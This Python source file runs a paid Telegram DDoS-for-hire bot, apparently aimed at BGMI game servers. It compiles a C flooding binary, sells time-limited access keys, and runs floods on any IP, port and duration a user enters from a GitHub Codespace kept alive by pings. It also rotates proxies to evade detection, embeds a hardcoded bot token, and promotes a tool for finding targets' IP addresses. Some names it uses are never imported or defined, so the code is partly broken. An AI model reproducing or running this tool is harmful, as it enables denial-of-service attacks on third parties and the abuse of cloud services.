import subprocess
import sys

# List of packages to install
packages = [
    "telebot",
    "pyTelegramBotAPI",
    "requests",
    "psutil",
    "pymongo",
    "aiogram",
    "aiohttp",
    "pytz",
    "telethon",
    "timedelta",
    "python-telegram-bot",
]

# Function to install packages
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Install each package
for package in packages:
    try:
        print(f"Installing {package}...")
        install(package)
        print(f"{package} installed successfully.\n")
    except subprocess.CalledProcessError:
        print(f"Failed to install {package}.\n")
        
import time
import logging
import json
import os
from threading import Thread
import telebot
import asyncio
import random
import string
from datetime import datetime, timedelta
from keepalive import keep_alive
from telebot.apihelper import ApiTelegramException
# Define the command to run
command = ["gcc", "vj.c", "-o", "bgmi", "-lpthread"]

try:
    # Run the command
    subprocess.run(command, check=True)
    print("Compilation successful.")
except subprocess.CalledProcessError as e:
    print(f"An error occurred during compilation: {e}")
    


# Keep-Alive Function
def keep_alive():
    print("Keeping Codespace alive by performing periodic activity...")
    try:
        response = requests.get("https://www.google.com")
        if response.status_code == 200:
            print("Ping successful. Codespace is still active.")
        else:
            print(f"Ping failed with status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred during ping: {e}")

# Keep-Alive Thread
def start_keep_alive_thread():
    while True:
        keep_alive()
        time.sleep(300)  # Sleep for 5 minutes (300 seconds) before the next ping

# Start keep-alive in a separate thread
Thread(target=start_keep_alive_thread, daemon=True).start()

# Convert ADMIN_IDS to a list of integers
ADMIN_IDS = [5344691638]  # Changed from string to list of integers
BOT_TOKEN = "7970419786:AAFmXQB1ddwKXsiyjnZ_akdZGASBuVYJmNY"

bot = telebot.TeleBot(BOT_TOKEN)
redeemed_keys = set()

# Proxy Update Command with Dark Authority
def update_proxy():
    proxy_list = []  # Define proxies here
    proxy = random.choice(proxy_list) if proxy_list else None
    if proxy:
        telebot.apihelper.proxy = {'https': proxy}
        logging.info("🕴️ Proxy shift complete. Surveillance evaded.")

@bot.message_handler(commands=['update_proxy'])
def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        update_proxy()
        bot.send_message(chat_id, f"🔄 Proxy locked in. We’re untouchable. Bot by {username}")
    except Exception as e:
        bot.send_message(chat_id, f"⚠️ Proxy config failed: {e}")
        
        
# File paths
USERS_FILE = 'users.txt'
KEYS_FILE = 'key.txt'

keys = {}

def load_users():
    try:
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []
    except json.JSONDecodeError:
        return []

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f)

def get_username_from_id(user_id):
    users = load_users()
    for user in users:
        if user['user_id'] == user_id:
            return user.get('username', 'N/A')
    return "N/A"

def is_admin(user_id):
    return user_id in ADMIN_IDS

def load_keys():
    try:
        with open(KEYS_FILE, 'r') as f:
            keys = {}
            for line in f:
                key_data = json.loads(line.strip())
                for key, duration_str in key_data.items():
                    # Convert the stored string duration back to timedelta
                    days, seconds = map(float, duration_str.split(','))
                    keys[key] = timedelta(days=days, seconds=seconds)
            return keys
    except FileNotFoundError:
        return {}
    except json.JSONDecodeError:
        return {}

def save_keys(keys):
    with open(KEYS_FILE, 'w') as f:
        for key, duration in keys.items():
            # Convert timedelta to a string representation
            duration_str = f"{duration.days},{duration.seconds}"
            f.write(f"{json.dumps({key: duration_str})}\n")

def generate_key(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

async def run_attack_command_on_codespace(target_ip, target_port, duration, chat_id):
    command = f"./bgmi {target_ip} {target_port} {duration}"
    try:
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        output = stdout.decode().replace("", "@DdosWalaGroup")
        error = stderr.decode()

        if output:
            logging.info(f"Command output: {output}")
        if error:
            logging.error(f"Command error: {error}")
            bot.send_message(chat_id, "Error occurred while running the attack. Check logs for more details.")
            return

        bot.send_message(chat_id, "𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱 🚀")
    except Exception as e:
        logging.error(f"Failed to execute command on Codespace: {e}")
        bot.send_message(chat_id, "Failed to execute the attack. Please try again later.")
        

@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    users = load_users()
    found_user = next((user for user in users if user['user_id'] == user_id), None)

    if not found_user:
        bot.send_message(chat_id, "*You are not registered. Please redeem a key.\nContact :- https://t.me/DarkDdosOwner")
        return

    try:
        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command, chat_id)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message, chat_id):
    try:
        args = message.text.split()
        
        if len(args) != 3:
            bot.send_message(chat_id, "*Invalid command format. Please use: target_ip target_port duration*", parse_mode='Markdown')
            return
        
        target_ip = args[0]
        
        try:
            target_port = int(args[1])
        except ValueError:
            bot.send_message(chat_id, "*Port must be a valid number.*", parse_mode='Markdown')
            return
        
        try:
            duration = int(args[2])
        except ValueError:
            bot.send_message(chat_id, "*Duration must be a valid number.*", parse_mode='Markdown')
            return

        if target_port in blocked_ports:
            bot.send_message(chat_id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_on_codespace(target_ip, target_port, duration, chat_id), loop)
        bot.send_message(chat_id, f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target_ip}:{target_port}\n𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration} seconds")
    
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")
        bot.send_message(chat_id, "*An error occurred while processing your command.*")

@bot.message_handler(commands=['owner'])
def send_owner_info(message):
    owner_message = "Owner:- https://t.me/DarkDdosOwner"
    bot.send_message(message.chat.id, owner_message)

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_forever()

from telebot.types import ReplyKeyboardMarkup, KeyboardButton


@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    username = message.from_user.username or "N/A"

    welcome_message = (f"Welcome, {username}! To @DarkDdosHack\n\n"
                       f"Please redeem a key to access bot functionalities.\n"
                       f"Commands To use:\n/genkey (To generate key)\n/remove (To remove user)\n/users (List of users)\n\n\n/redeem (To redeem key)")

    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    my_account_button = KeyboardButton("🔑 My Account")
    attack_button = KeyboardButton("🚀 Attack")
    markup.add(my_account_button, attack_button,)

    bot.send_message(message.chat.id, welcome_message, reply_markup=markup)

@bot.message_handler(commands=['genkey'])
def genkey_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_admin(user_id):
        bot.send_message(chat_id, "*You are not authorized to generate keys.\nContact Owner: @DdosWalaGroup*", reply_markup=keyboard, parse_mode='Markdown')
        return

    cmd_parts = message.text.split()
    if len(cmd_parts) != 3:
        bot.send_message(chat_id, "*Usage: /genkey <amount> <hours/days>*", parse_mode='Markdown')
        return
    
    try:
        amount = int(cmd_parts[1])
        time_unit = cmd_parts[2].lower()
        
        if time_unit in ['hour', 'hours']:
            duration = timedelta(hours=amount)
        elif time_unit in ['day', 'days']:
            duration = timedelta(days=amount)
        else:
            bot.send_message(chat_id, "*Invalid time unit. Use 'hours' or 'days'.*", parse_mode='Markdown')
            return
        
        # Load existing keys
        global keys
        keys = load_keys()
        
        # Generate a single key
        key = generate_key()
        keys[key] = duration
        
        # Save the updated keys
        save_keys(keys)
        
        bot.send_message(chat_id, f"Generated key: `{key}`\n\nCopy This Key And Paste like this\n/redeem <key>", parse_mode='Markdown')
    
    except ValueError:
        bot.send_message(chat_id, "*Invalid amount. Please enter a number.*", parse_mode='Markdown')
        return

@bot.message_handler(commands=['redeem'])
def redeem_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    cmd_parts = message.text.split()

    if len(cmd_parts) != 2:
        bot.send_message(chat_id, "*Usage: /redeem <key>*", parse_mode='Markdown')
        return

    key = cmd_parts[1]
    
    # Load the current keys
    global keys
    keys = load_keys()
    
    # Check if the key is valid and not already redeemed
    if key in keys and key not in redeemed_keys:
        duration = keys[key]  # This is already a timedelta
        expiration_time = datetime.now() + duration

        users = load_users()
        # Save the user info to users.txt
        found_user = next((user for user in users if user['user_id'] == user_id), None)
        if not found_user:
            new_user = {
                'user_id': user_id,
                'username': f"@{message.from_user.username}" if message.from_user.username else "Unknown",
                'valid_until': expiration_time.isoformat().replace('T', ' '),
                'current_date': datetime.now().isoformat().replace('T', ' '),
                'plan': 'Plan Premium'
            }
            users.append(new_user)
        else:
            found_user['valid_until'] = expiration_time.isoformat().replace('T', ' ')
            found_user['current_date'] = datetime.now().isoformat().replace('T', ' ')

        # Mark the key as redeemed
        redeemed_keys.add(key)
        # Remove the used key from the keys file
        del keys[key]
        save_keys(keys)
        save_users(users)

        bot.send_message(chat_id, "*Key redeemed successfully!*", parse_mode='Markdown')
    else:
        if key in redeemed_keys:
            bot.send_message(chat_id, "*This key has already been redeemed!*", parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "*Invalid key!*", parse_mode='Markdown')

@bot.message_handler(commands=['remove'])
def remove_user_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_admin(user_id):
        bot.send_message(chat_id, "*You are not authorized to remove users.\nContact Owner:- @DdosWalaGroup*", parse_mode='Markdown')
        return

    cmd_parts = message.text.split()
    if len(cmd_parts) != 2:
        bot.send_message(chat_id, "*Usage: /remove <user_id>*", parse_mode='Markdown')
        return

    target_user_id = int(cmd_parts[1])
    users = load_users()
    users = [user for user in users if user['user_id'] != target_user_id]
    save_users(users)

    bot.send_message(chat_id, f"User {target_user_id} has been removed.")

@bot.message_handler(commands=['users'])
def list_users_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_admin(user_id):
        bot.send_message(chat_id, "*You are not authorized to view the users.*", parse_mode='Markdown')
        return

    users = load_users()
    valid_users = [user for user in users if datetime.now() < datetime.fromisoformat(user['valid_until'])]

    if valid_users:
        user_list = "\n".join(f"ID: {user['user_id']}, Username: {user.get('username', 'N/A')}" for user in valid_users)
        bot.send_message(chat_id, f"Registered users:\n{user_list}")
    else:
        bot.send_message(chat_id, "No users have valid keys.")

@bot.message_handler(func=lambda message: message.text == "🚀 Attack")
def attack_button_handler(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    users = load_users()
    found_user = next((user for user in users if user['user_id'] == user_id), None)

    if not found_user:
        bot.send_message(chat_id, "*You are not registered. Please redeem A key To Owner:- @DdosWalaGroup*", parse_mode='Markdown')
        return

    valid_until = datetime.fromisoformat(found_user['valid_until'])
    if datetime.now() > valid_until:
        bot.send_message(chat_id, "*Your key has expired. Please redeem A key To Owner:- https://t.me/DarkDdosOwner ", parse_mode='Markdown')
        return

    try:
        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command, chat_id)
    except Exception as e:
        logging.error(f"Error in attack button: {e}")
    
@bot.message_handler(func=lambda message: message.text == "🔑 My Account")
def my_account(message):
    user_id = message.from_user.id
    users = load_users()

    # Find the user in the list
    found_user = next((user for user in users if user['user_id'] == user_id), None)

    if found_user:
        valid_until = datetime.fromisoformat(found_user.get('valid_until', 'N/A')).strftime('%Y-%m-%d %H:%M:%S')
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        # Check if the user's key is still valid
        if datetime.now() > datetime.fromisoformat(found_user['valid_until']):
            account_info = ("Your key has expired. Please redeem a new key.\n"
                            "Contact :- https://t.me/DarkDdosOwner")
        else:
            account_info = (f"Your Account Information:\n\n"
                            f"Username: {found_user.get('username', 'N/A')}\n"
                            f"Valid Until: {valid_until}\n"
                            f"Plan: {found_user.get('plan', 'N/A')}\n"
                            f"Current Time: {current_time}")
    else:
        account_info = "Please redeem A key To Owner:- https://t.me/DarkDdosOwner "

    bot.send_message(message.chat.id, account_info)
    
@bot.message_handler(commands=['canary'])
def canary_command(message):
    response = ("*📥 Download the HttpCanary APK Now! 📥*\n\n"
                "*🔍 Track IP addresses with ease and stay ahead of the game! 🔍*\n"
                "*💡 Utilize this powerful tool wisely to gain insights and manage your network effectively. 💡*\n\n"
                "*Choose your platform:*")

    markup = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton(
        text="📱 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗙𝗼𝗿 𝗔𝗻𝗱𝗿𝗼𝗶𝗱 📱",
        url="https://t.me/c/2035091831/88")
    button2 = types.InlineKeyboardButton(
        text="🍎 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗳𝗼𝗿 𝗶𝗢𝗦 🍎",
        url="https://apps.apple.com/in/app/surge-5/id1442620678")

    markup.add(button1)
    markup.add(button2)

    try:
        bot.send_message(message.chat.id,
                         response,
                         parse_mode='Markdown',
                         reply_markup=markup)
    except Exception as e:
        logging.error(f"Error while processing /canary command: {e}")

    
if __name__ == '__main__':
    # Start the keepalive server
    keep_alive()
    
    # Create event loop
    loop = asyncio.new_event_loop()
    Thread(target=start_asyncio_thread).start()

    while True:
        try:
            print("Bot started successfully!")
            bot.polling(timeout=60)
        except ApiTelegramException as e:
            logging.error(f"Telegram API error: {e}")
            time.sleep(5)
        except Exception as e:
            logging.error(f"Unexpected error: {e}")
            time.sleep(5)
